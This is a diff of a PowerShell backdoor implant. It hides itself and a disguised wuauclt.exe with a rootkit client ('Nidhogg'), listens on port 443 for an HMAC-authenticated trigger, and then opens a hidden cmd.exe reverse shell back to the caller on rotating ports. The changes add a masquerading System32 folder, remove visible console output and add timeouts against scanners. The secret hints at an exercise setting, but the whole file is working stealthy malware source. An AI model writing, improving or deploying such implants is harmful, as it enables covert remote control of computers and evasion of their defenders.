@@ -1,10 +1,11 @@
-# Implant.ps1 - FINAL STABLE VERSION (No Migration)
+# Implant.ps1
 $SharedSecret = "bluewinstheday!!"
 $TriggerPort  = 443
 $BaseReversePort = 4444
 $CurrentReversePort = $BaseReversePort
 
-$NidhoggClient = "C:\Windows\System32\wuauclt.exe"
+$AppDir = "C:\Windows\System32\WindowsModulesAssistant"
+$NidhoggClient = "$AppDir\wuauclt.exe"
 
 function Invoke-Nidhogg {
     param([string]$Cmd)
@@ -15,11 +16,10 @@ function Invoke-Nidhogg {
 
 # Initial hiding
 Invoke-Nidhogg "process hide $PID"
-Invoke-Nidhogg "file hide C:\Windows\System32\Implant.ps1"
+Invoke-Nidhogg "file hide $AppDir\Implant.ps1"
+Invoke-Nidhogg "file hide $AppDir\wuauclt.exe"
 Invoke-Nidhogg "port hide $TriggerPort tcp remote"
 Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
-
-Write-Host "[+] Implant started with Nidhogg protections" -ForegroundColor Green
 
 while ($true) {
     try {
@@ -61,6 +61,11 @@ while ($true) {
         try {
             $client = $listener.AcceptTcpClient()
             $stream = $client.GetStream()
+            
+            # --- THE FIX: 5-second timeout prevents deadlock from scanners ---
+            $stream.ReadTimeout = 5000
+            $stream.WriteTimeout = 5000
+            
             $reader = New-Object System.IO.StreamReader($stream)
             $writer = New-Object System.IO.StreamWriter($stream)
             $writer.AutoFlush = $true
@@ -68,78 +73,84 @@ while ($true) {
             # HMAC Challenge-Response
             $challenge = Get-Random -Maximum 1000000000
             $writer.WriteLine("CHALLENGE:$challenge")
-            $response = $reader.ReadLine().Trim()
+            
+            try {
+                $response = $reader.ReadLine()
+            } catch {
+                # If the read times out, response is null, and we skip to finally block
+                $response = $null
+            }
 
-            $hmac = New-Object System.Security.Cryptography.HMACSHA256
-            $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
-            $expected = -join ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge")) | ForEach-Object { $_.ToString("x2") })
+            if (-not [string]::IsNullOrWhiteSpace($response)) {
+                $response = $response.Trim()
+                $hmac = New-Object System.Security.Cryptography.HMACSHA256
+                $hmac.Key = [Text.Encoding]::UTF8.GetBytes($SharedSecret)
+                $expected = -join ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes("$challenge")) | ForEach-Object { $_.ToString("x2") })
 
-            if ($response -eq $expected) {
-                # PORT DIVERSION
-                $writer.WriteLine("OK - Using port $CurrentReversePort")
-                Start-Sleep -Seconds 1
+                if ($response -eq $expected) {
+                    # PORT DIVERSION
+                    $writer.WriteLine("OK - Using port $CurrentReversePort")
+                    Start-Sleep -Seconds 1
 
-                $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
-                $listener.Stop()
+                    $remoteIP = $client.Client.RemoteEndPoint.Address.ToString()
+                    $listener.Stop()
 
-                # Hide new port, unhide old one
-                Invoke-Nidhogg "port unhide $CurrentReversePort tcp remote"
-                $CurrentReversePort = $CurrentReversePort + 1
-                if ($CurrentReversePort -gt 4455) { $CurrentReversePort = $BaseReversePort }
-                Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
+                    # Hide new port, unhide old one
+                    Invoke-Nidhogg "port unhide $CurrentReversePort tcp remote"
+                    $CurrentReversePort = $CurrentReversePort + 1
+                    if ($CurrentReversePort -gt 4455) { $CurrentReversePort = $BaseReversePort }
+                    Invoke-Nidhogg "port hide $CurrentReversePort tcp remote"
 
-                Write-Host "[+] Reverse shell to $remoteIP`:$CurrentReversePort" -ForegroundColor Green
+                    # ====================== REVERSE SHELL ======================
+                    $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $CurrentReversePort)
+                    $revStream = $revClient.GetStream()
+                    $revWriter = New-Object System.IO.StreamWriter($revStream)
+                    $revReader = New-Object System.IO.StreamReader($revStream)
+                    $revWriter.AutoFlush = $true
 
-                # ====================== REVERSE SHELL ======================
-                $revClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $CurrentReversePort)
-                $revStream = $revClient.GetStream()
-                $revWriter = New-Object System.IO.StreamWriter($revStream)
-                $revReader = New-Object System.IO.StreamReader($revStream)
-                $revWriter.AutoFlush = $true
+                    $process = New-Object System.Diagnostics.Process
+                    $process.StartInfo.FileName = "cmd.exe"
+                    $process.StartInfo.Arguments = "/Q"
+                    $process.StartInfo.RedirectStandardInput = $true
+                    $process.StartInfo.RedirectStandardOutput = $true
+                    $process.StartInfo.RedirectStandardError = $true
+                    $process.StartInfo.UseShellExecute = $false
+                    $process.StartInfo.CreateNoWindow = $true
+                    $process.StartInfo.WindowStyle = "Hidden"
+                    $process.Start() | Out-Null
 
-                $process = New-Object System.Diagnostics.Process
-                $process.StartInfo.FileName = "cmd.exe"
-                $process.StartInfo.Arguments = "/Q"
-                $process.StartInfo.RedirectStandardInput = $true
-                $process.StartInfo.RedirectStandardOutput = $true
-                $process.StartInfo.RedirectStandardError = $true
-                $process.StartInfo.UseShellExecute = $false
-                $process.StartInfo.CreateNoWindow = $true
-                $process.StartInfo.WindowStyle = "Hidden"
-                $process.Start() | Out-Null
+                    Invoke-Nidhogg "process hide $($process.Id)"
 
-                Invoke-Nidhogg "process hide $($process.Id)"
+                    # Async I/O
+                    $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
+                    $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }
 
-                # Good async I/O
-                $outputAction = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine($e.Data) } } catch {} }
-                $errorAction  = { param($s, $e); try { if ($e.Data) { $revWriter.WriteLine("[ERR] $($e.Data)") } } catch {} }
+                    $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
+                    $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction
 
-                $outEvent = Register-ObjectEvent $process.StandardOutput "OutputDataReceived" -Action $outputAction
-                $errEvent = Register-ObjectEvent $process.StandardError  "ErrorDataReceived"  -Action $errorAction
+                    $process.BeginOutputReadLine()
+                    $process.BeginErrorReadLine()
 
-                $process.BeginOutputReadLine()
-                $process.BeginErrorReadLine()
-
-                try {
-                    while (-not $process.HasExited -and $revClient.Connected) {
-                        if ($revStream.DataAvailable) {
-                            $cmd = $revReader.ReadLine()
-                            if ($cmd) { $process.StandardInput.WriteLine($cmd) }
+                    try {
+                        while (-not $process.HasExited -and $revClient.Connected) {
+                            if ($revStream.DataAvailable) {
+                                $cmd = $revReader.ReadLine()
+                                if ($cmd) { $process.StandardInput.WriteLine($cmd) }
+                            }
+                            Start-Sleep -Milliseconds 50
                         }
-                        Start-Sleep -Milliseconds 50
+                    } finally {
+                        if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
+                        if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
+                        if (-not $process.HasExited) { $process.Kill() }
+                        $revClient.Close()
                     }
-                } finally {
-                    if ($outEvent) { Unregister-Event -SourceIdentifier $outEvent.Name -EA SilentlyContinue }
-                    if ($errEvent) { Unregister-Event -SourceIdentifier $errEvent.Name -EA SilentlyContinue }
-                    if (-not $process.HasExited) { $process.Kill() }
-                    $revClient.Close()
+                } else {
+                    $writer.WriteLine("DENIED")
                 }
-            } else {
-                $writer.WriteLine("DENIED")
             }
         }
         finally {
-            # Clean port release
             if ($listener) { 
                 try { $listener.Stop(); $listener.Server.Dispose() } catch {} 
             }
